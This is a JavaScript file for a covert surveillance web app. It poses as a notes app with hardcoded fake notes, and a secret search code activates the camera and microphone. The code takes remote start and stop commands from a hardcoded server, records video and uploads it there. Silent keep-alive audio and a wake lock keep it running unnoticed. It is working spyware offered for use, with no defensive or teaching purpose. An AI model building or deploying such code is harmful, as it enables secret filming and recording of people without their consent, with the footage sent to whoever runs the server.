// SECURECAM v3 - Hidden Camera Notes App
// Secret Code: 243 (type in search bar to activate camera)

const SERVER_URL = 'https://familiar-gertrudis-botakingtipd-f3991937.koyeb.app'; // CHANGE THIS to your server URL
const SECRET_PIN = '243';
const POLL_INTERVAL = 1000; // 1 second

let cameraActive = false;
let isRecording = false;
let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let wakeLock = null;
let pollingTimer = null;

// Fake notes to make app look real
const fakeNotes = [
    { id: 1, title: 'Shopping List', content: 'Milk, eggs, bread, butter, cheese', date: 'Today, 2:30 PM' },
    { id: 2, title: 'Meeting Notes', content: 'Discuss project timeline and budget', date: 'Yesterday, 10:15 AM' },
    { id: 3, title: 'Ideas', content: 'Learn Python, build a portfolio website', date: 'Jan 18, 4:45 PM' },
    { id: 4, title: 'Workout Plan', content: 'Monday: Chest, Wednesday: Back, Friday: Legs', date: 'Jan 17, 7:00 PM' }
];

// Initialize app
document.addEventListener('DOMContentLoaded', function() {
    renderNotes();
    setupEventListeners();
    startKeepAlive();
    console.log('[SecureCam] App loaded');
});

// Render notes list
function renderNotes() {
    var notesList = document.getElementById('notesList');
    if (!notesList) return;
    
    if (fakeNotes.length === 0) {
        notesList.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📝</div><div class="empty-state-text">No notes yet</div></div>';
        return;
    }
    
    notesList.innerHTML = fakeNotes.map(function(note) {
        return '<div class="note-card" data-id="' + note.id + '">' +
            '<div class="note-card-title">' + escapeHtml(note.title) + '</div>' +
            '<div class="note-card-preview">' + escapeHtml(note.content) + '</div>' +
            '<div class="note-card-date">' + escapeHtml(note.date) + '</div>' +
        '</div>';
    }).join('');
    
    // Add click handlers
    var cards = notesList.querySelectorAll('.note-card');
    cards.forEach(function(card) {
        card.addEventListener('click', function() {
            var id = parseInt(card.getAttribute('data-id'));
            openNote(id);
        });
    });
}

function openNote(id) {
    var note = fakeNotes.find(function(n) { return n.id === id; });
    if (!note) return;
    
    document.getElementById('noteTitle').value = note.title;
    document.getElementById('noteContent').value = note.content;
    showScreen('screenNoteEditor');
}

function showScreen(screenId) {
    var screens = document.querySelectorAll('.screen');
    screens.forEach(function(s) { s.classList.remove('active'); });
    document.getElementById(screenId).classList.add('active');
}

function showToast(message, duration) {
    duration = duration || 2000;
    var toast = document.getElementById('toast');
    toast.textContent = message;
    toast.classList.add('show');
    
    setTimeout(function() {
        toast.classList.remove('show');
    }, duration);
}

function escapeHtml(text) {
    var div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Event Listeners
function setupEventListeners() {
    // Search button
    var btnSearch = document.getElementById('btnSearch');
    if (btnSearch) {
        btnSearch.addEventListener('click', function() {
            var searchBar = document.getElementById('searchBar');
            searchBar.style.display = (searchBar.style.display === 'none' || !searchBar.style.display) ? 'flex' : 'none';
            if (searchBar.style.display === 'flex') {
                document.getElementById('searchInput').focus();
            }
        });
    }
    
    // Close search
    var btnCloseSearch = document.getElementById('btnCloseSearch');
    if (btnCloseSearch) {
        btnCloseSearch.addEventListener('click', function() {
            document.getElementById('searchBar').style.display = 'none';
            document.getElementById('searchInput').value = '';
        });
    }
    
    // Search input - check for secret code
    var searchInput = document.getElementById('searchInput');
    if (searchInput) {
        searchInput.addEventListener('input', function(e) {
            var value = e.target.value.trim();
            
            if (value === SECRET_PIN) {
                e.target.value = '';
                document.getElementById('searchBar').style.display = 'none';
                
                if (!cameraActive) {
                    activateCamera();
                } else {
                    showToast('Camera already active');
                }
            }
        });
    }
    
    // Settings button
    var btnSettings = document.getElementById('btnSettings');
    if (btnSettings) {
        btnSettings.addEventListener('click', function() {
            showScreen('screenSettings');
        });
    }
    
    // Back buttons
    var btnBackEditor = document.getElementById('btnBackEditor');
    if (btnBackEditor) {
        btnBackEditor.addEventListener('click', function() {
            showScreen('screenNotesList');
        });
    }
    
    var btnBackSettings = document.getElementById('btnBackSettings');
    if (btnBackSettings) {
        btnBackSettings.addEventListener('click', function() {
            showScreen('screenNotesList');
        });
    }
    
    // Save note
    var btnSaveNote = document.getElementById('btnSaveNote');
    if (btnSaveNote) {
        btnSaveNote.addEventListener('click', function() {
            showToast('Note saved');
            showScreen('screenNotesList');
        });
    }
    
    // Add note
    var btnAddNote = document.getElementById('btnAddNote');
    if (btnAddNote) {
        btnAddNote.addEventListener('click', function() {
            document.getElementById('noteTitle').value = '';
            document.getElementById('noteContent').value = '';
            showScreen('screenNoteEditor');
        });
    }
    
    // Export notes
    var btnExport = document.getElementById('btnExportNotes');
    if (btnExport) {
        btnExport.addEventListener('click', function() {
            var data = JSON.stringify(fakeNotes, null, 2);
            var blob = new Blob([data], { type: 'application/json' });
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'notes.json';
            a.click();
            URL.revokeObjectURL(url);
            showToast('Notes exported');
        });
    }
}

// Camera Functions
async function activateCamera() {
    if (cameraActive) {
        console.log('[SecureCam] Camera already active');
        return;
    }
    
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: true
        });
        
        var video = document.getElementById('cameraVideo');
        video.srcObject = mediaStream;
        await video.play();
        
        cameraActive = true;
        console.log('[SecureCam] Camera activated');
        showToast('Camera ready');
        
        startCommandPolling();
        requestWakeLock();
        
    } catch (err) {
        console.error('[SecureCam] Camera error:', err);
        showToast('Camera access denied');
    }
}

function startRecording() {
    if (!cameraActive || isRecording) return;
    
    try {
        recordedChunks = [];
        
        var mimeType = 'video/webm;codecs=vp8,opus';
        if (typeof MediaRecorder !== 'undefined') {
            if (MediaRecorder.isTypeSupported('video/mp4')) {
                mimeType = 'video/mp4';
            } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
                mimeType = 'video/webm;codecs=vp9,opus';
            }
        }
        
        mediaRecorder = new MediaRecorder(mediaStream, {
            mimeType: mimeType,
            videoBitsPerSecond: 2500000
        });
        
        mediaRecorder.ondataavailable = function(e) {
            if (e.data && e.data.size > 0) {
                recordedChunks.push(e.data);
            }
        };
        
        mediaRecorder.onstop = function() {
            var blob = new Blob(recordedChunks, { type: mimeType });
            uploadVideo(blob, mimeType);
        };
        
        mediaRecorder.start(1000);
        isRecording = true;
        console.log('[SecureCam] Recording started');
        
    } catch (err) {
        console.error('[SecureCam] Recording error:', err);
    }
}

function stopRecording() {
    if (!mediaRecorder || !isRecording) return;
    
    try {
        mediaRecorder.stop();
        isRecording = false;
        console.log('[SecureCam] Recording stopped');
    } catch (err) {
        console.error('[SecureCam] Stop error:', err);
    }
}

async function uploadVideo(blob, mimeType) {
    if (!blob || blob.size === 0) return;
    
    console.log('[SecureCam] Uploading...');
    showToast('Uploading...');
    
    try {
        var formData = new FormData();
        var ext = (mimeType && mimeType.includes('mp4')) ? 'mp4' : 'webm';
        var filename = 'recording_' + Date.now() + '.' + ext;
        
        formData.append('video', blob, filename);
        
        var response = await fetch(SERVER_URL + '/api/video/upload', {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            console.log('[SecureCam] Upload successful');
            showToast('Video uploaded');
        } else {
            console.error('[SecureCam] Upload failed:', response.status);
            showToast('Upload failed');
        }
    } catch (err) {
        console.error('[SecureCam] Upload error:', err);
        showToast('Upload error');
    }
}

// Command Polling
function startCommandPolling() {
    if (pollingTimer) {
        clearInterval(pollingTimer);
    }
    
    pollCommand();
    pollingTimer = setInterval(pollCommand, POLL_INTERVAL);
}

async function pollCommand() {
    if (!cameraActive) return;
    
    try {
        var response = await fetch(SERVER_URL + '/api/cmd/get');
        
        if (response.ok) {
            var data = await response.json();
            
            if (data.action === 'start') {
                console.log('[SecureCam] Command: START');
                if (!isRecording) startRecording();
            } else if (data.action === 'stop') {
                console.log('[SecureCam] Command: STOP');
                if (isRecording) stopRecording();
            }
        }
    } catch (err) {
        console.error('[SecureCam] Poll error:', err);
    }
}

// Background Keep-Alive
function startKeepAlive() {
    var audio = document.getElementById('keepAliveAudio');
    if (audio) {
        audio.volume = 0.01;
        audio.play().catch(function(err) {
            console.log('[SecureCam] Audio needs interaction:', err.message);
        });
        
        document.addEventListener('click', function() {
            if (audio) audio.play().catch(function() {});
        }, { once: true });
    }
}

async function requestWakeLock() {
    try {
        if ('wakeLock' in navigator) {
            wakeLock = await navigator.wakeLock.request('screen');
            console.log('[SecureCam] Wake lock acquired');
            
            wakeLock.addEventListener('release', function() {
                console.log('[SecureCam] Wake lock released');
                if (cameraActive) {
                    setTimeout(requestWakeLock, 1000);
                }
            });
        }
    } catch (err) {
        console.error('[SecureCam] Wake lock error:', err);
    }
}

// Handle app going to background
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        console.log('[SecureCam] App backgrounded');
        if (cameraActive) {
            requestWakeLock();
        }
    } else {
        console.log('[SecureCam] App foregrounded');
    }
});
